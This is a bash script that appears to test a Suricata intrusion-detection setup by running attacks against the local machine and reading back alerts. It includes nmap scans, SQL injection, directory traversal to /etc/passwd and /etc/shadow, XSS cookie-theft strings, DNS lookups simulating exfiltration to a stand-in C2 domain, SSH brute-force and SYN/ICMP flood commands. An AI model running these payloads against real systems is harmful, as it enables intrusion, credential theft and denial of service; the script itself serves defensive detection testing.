#!/bin/bash

echo "=== Network-Level Attack Simulation ==="
echo "These tests generate actual network traffic that Suricata can inspect"
echo ""

# Get the network interface Suricata is monitoring
INTERFACE="wlp45s0"
echo "Network interface: $INTERFACE"

# Get the actual network IP (not localhost) so Suricata can capture traffic
TARGET_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d/ -f1)
if [ -z "$TARGET_IP" ]; then
    echo "ERROR: Could not find IP for $INTERFACE interface"
    exit 1
fi
echo "Target IP: $TARGET_IP"
echo ""

# API Configuration
API_URL="https://localhost:30081"

# Function to check alerts
check_new_alerts() {
    echo "Checking for new alerts..."
    sleep 3
    curl -sk "$API_URL/api/suricata/alerts/recent?limit=5" | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature)"' 2>/dev/null
    echo ""
}

# Test 1: ICMP Ping Sweep (Network Reconnaissance)
echo "Test 1: ICMP Ping Sweep"
echo "Scanning local network..."
sudo nmap -sn $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

# Test 2: TCP SYN Scan
echo "Test 2: TCP SYN Scan (Port Scanning)"
echo "Scanning common ports on target..."
sudo nmap -sS -p 21,22,23,25,80,443,3389,8080 $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

# Test 3: OS Fingerprinting
echo "Test 3: OS Fingerprinting Attack"
echo "Attempting OS detection..."
sudo nmap -O $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

# Test 4: UDP Scan
echo "Test 4: UDP Port Scan"
echo "Scanning UDP ports..."
sudo nmap -sU -p 53,161,500 $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

# Test 5: Aggressive scan with version detection
echo "Test 5: Service Version Detection"
echo "Detecting service versions..."
sudo nmap -sV -p 80,443 $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

# Test 6: HTTP with Suspicious Patterns
echo "Test 6: HTTP Requests with Attack Patterns"
echo "Sending HTTP requests with malicious patterns..."

# SQL Injection patterns
curl -sk "$API_URL/artists.php?artist=1' OR '1'='1" > /dev/null 2>&1
curl -sk "$API_URL/artists.php?artist=1 UNION SELECT NULL,NULL,NULL--" > /dev/null 2>&1

# Directory traversal
curl -sk "$API_URL/../../etc/passwd" > /dev/null 2>&1
curl -sk "$API_URL/admin/../../../../../../etc/shadow" > /dev/null 2>&1

# XSS
curl -sk "$API_URL/search.php?test=<script>alert(document.cookie)</script>" > /dev/null 2>&1

check_new_alerts

# Test 7: Suspicious User Agents
echo "Test 7: Attack Tool User Agents"
echo "Using known attack tool signatures..."
curl -sk -A "sqlmap/1.4.7" "$API_URL/" > /dev/null 2>&1
curl -sk -A "Nikto/2.1.6" "$API_URL/" > /dev/null 2>&1
curl -sk -A "w3af.org" "$API_URL/" > /dev/null 2>&1
curl -sk -A "Metasploit RSPEC" "$API_URL/" > /dev/null 2>&1
check_new_alerts

# Test 8: DNS Tunneling/Exfiltration
echo "Test 8: Suspicious DNS Queries"
echo "Simulating DNS tunneling..."
for subdomain in data1 data2 data3 exfil test; do
    nslookup "${subdomain}.malicious-c2-server.com" 8.8.8.8 > /dev/null 2>&1
    nslookup "${subdomain}.botnet.example.com" 8.8.8.8 > /dev/null 2>&1
done
check_new_alerts

# Test 9: SSH Brute Force
echo "Test 9: SSH Brute Force Simulation"
echo "Multiple failed SSH attempts..."
for user in admin root test user; do
    timeout 2 sshpass -p "wrongpass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 ${user}@$TARGET_IP 2>/dev/null &
done
check_new_alerts

# Test 10: SYN Flood Simulation (CRITICAL Alert Test)
echo "Test 10: SYN Flood Simulation"
echo "Sending 500 SYN packets to port 443..."
sudo hping3 -S -p 443 -c 500 -i u10000 $TARGET_IP > /dev/null 2>&1
check_new_alerts

# Test 11: ICMP Flood (small scale)
echo "Test 11: ICMP Flood Test"
echo "Sending rapid ICMP packets..."
sudo ping -f -c 100 $TARGET_IP > /dev/null 2>&1 &
check_new_alerts

echo "=== All Network Tests Complete ==="
echo ""
echo "Final Statistics:"
curl -sk "$API_URL/api/suricata/statistics/today" | jq '{
  totalAlerts,
  criticalAlerts,
  highAlerts,
  mediumAlerts,
  lowAlerts
}' 2>/dev/null

echo ""
echo "Recent Alerts (Last 15):"
curl -sk "$API_URL/api/suricata/alerts/recent?limit=15" | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature) | \(.sourceIp) -> \(.destIp)"' 2>/dev/null

echo ""
echo "View dashboard: $API_URL"
